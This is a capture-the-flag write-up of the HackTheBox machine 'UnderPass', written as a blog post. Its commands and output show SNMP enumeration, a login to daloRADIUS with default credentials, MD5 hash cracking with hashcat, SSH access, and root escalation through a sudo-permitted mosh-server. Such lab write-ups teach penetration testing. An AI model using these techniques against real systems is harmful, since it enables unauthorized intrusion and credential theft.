@@ -1,0 +1,187 @@
+---
+title: "HTB: UnderPass"
+date: 2024-12-23
+description: "UnderPass is a Linux machine that consists of using default credentials for initial foothold and elevating privileges using mosh-server."
+keywords: ["HTB", "HackTheBox", "MonitorsThree", "HTB UnderPass", "UnderPass.HTB"]
+draft: false
+---
+# Initial Foothold
+
+Let's start off by running nmap scan against our target.
+
+```bash
+kali@kali:~/HTB/Machines/UnderPass$ nmap -sV -sC -p- --min-rate=100000 -o nmap.result 10.10.11.48   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 18:39 EST
+Warning: 10.10.11.48 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.11.48
+Host is up (1.5s latency).
+Not shown: 46254 closed tcp ports (reset), 19279 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.08 seconds
+``` 
+
+Unfortunately, I was unable to find anything interesting with TCP ports therefore I started scanning for UDP ports against our target.
+
+```bash
+kali@kali:~/HTB/Machines/UnderPass$ nmap -sU --top-ports 100  --min-rate=100000 10.129.104.166
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 08:30 EST
+Nmap scan report for 10.129.104.166
+Host is up (0.074s latency).
+Not shown: 94 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+120/udp   closed cfdptkt
+161/udp   open   snmp
+996/udp   closed vsinet
+2048/udp  closed dls-monitor
+2049/udp  closed nfs
+49188/udp closed unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
+```
+
+SNMP service is running on port 161. So, I decided to enumerate through it by using snmpwalk as it can potentially contain confidential information's inside it.
+
+```bash
+kali@kali:~/HTB/Machines/UnderPass$ snmpwalk -c public -v1 '10.10.11.48'
+
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
+...
+iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
+iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
+iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
+...
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0"
+...
+```
+
+The string **"daloradius"** is interesting as this indicates the server has the DaloRADIUS application running on the server therefore I decided to use dirsearch and search for DaloRADIUS pages.
+
+```bash
+kali@kali:~/HTB/Machines/UnderPass$ dirsearch -u 'http://underpass.htb/daloradius/app'
+
+Target: http://underpass.htb/
+
+[07:11:03] Starting: daloradius/app/   
+[07:11:14] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
+[07:11:31] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
+[07:11:32] 302 -    0B  - /daloradius/app/users/  ->  home-main.php
+[07:11:32] 200 -    2KB - /daloradius/app/users/login.php
+
+Task Completed
+```
+
+The login page allows us to sign-in using the credentials `administrator:radius` which are the default creden-tials for the deloradius according to [DaloraRADIUS Documentation](https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS#testing-the-infrastructure).
+
+<img src="/assets/images/htb-underpass/htb-underpass-1.png" className="rounded-lg" />
+
+After successfully logging into the DaloRADIUS web application I decided to checkout the users section and found the following password hash for svcMosh.
+
+<img src="/assets/images/htb-underpass/htb-underpass-2.png" className="rounded-lg" />
+
+The password hash is encrypted using the MD5 algorithm and can be cracked by using Hashcat. 
+
+```bash
+kali@kali:~/HTB/Machines/UnderPass$ hashcat -m 0 -a 0 '412DD4759978ACFCC81DEAB01B382403' /usr/share/wordlists/rockyou.txt 
+...
+412dd4759978acfcc81deab01b382403:underwaterfriends
+...
+```
+
+Hashcat successfully managed to crack the password hash and I was able to login through SSH using the credentials `svcMosh:underwaterfriends` and read the user flag.
+
+```bash
+kali@kali:~/HTB/Machines/UnderPass$ ssh svcMosh@10.129.104.152
+svcMosh@underpass:~$ whoami
+svcMosh
+svcMosh@underpass:~$ hostname
+underpass
+svcMosh@underpass:~$ pwd
+/home/svcMosh
+svcMosh@underpass:~$ cat /home/svcMosh/user.txt
+[USER FLAG]
+```
+
+## Road To Privilege Escalation
+
+The svcMosh user is capable of running `mosh-server` as root according to sudo.
+
+```bash title="UnderPass: Checking SUDO"
+svcMosh@underpass:~$ sudo -l
+Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+```
+
+I decided to start the `mosh-server` with the `sudo` command using the `-v` parameter which enables debugging to search for potential vulnerabilities.
+
+```bash title="UnderPass Machine: Starting mosh-server"
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server new -p 60007 -v
+
+MOSH CONNECT 60007 yTscbXQMgR4czW8xmlEl7Q
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 2032]
+```
+
+```bash title="Kali Linux: Connecting to mosh-server"
+kali@kali:~/HTB/Machines/UnderPass$ MOSH_KEY='yTscbXQMgR4czW8xmlEl7Q' mosh-client 10.129.104.152 60007 
+```
+
+After connecting to the UnderPass machine with the `mosh-client` command, I successfully managed to co-nnect to the server as root and read the root flag.
+
+```bash title="Kali Linux: Opening mosh-client"
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon Dec 23 12:51:22 PM UTC 2024
+
+  System load:  0.0               Processes:             230
+  Usage of /:   85.6% of 3.75GB   Users logged in:       1
+  Memory usage: 11%               IPv4 address for eth0: 10.129.104.152
+  Swap usage:   0%
+
+  => / is using 85.6% of 3.75GB
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+root@underpass:~# whoami
+root
+root@underpass:~# hostname
+underpass
+root@underpass:~# pwd
+/root
+root@underpass:~# cat /root/root.txt
+[ROOT FLAG]
+```
+
+# Conclusion
+
+I'm currently getting more and more into the mindset of try-harder. What I leant from this box is the importance of constantly enumerating and using the smallest information you have about the target to obtain more and more information about the target. Which is an extremely important skill to have while doing anything with cyber security.
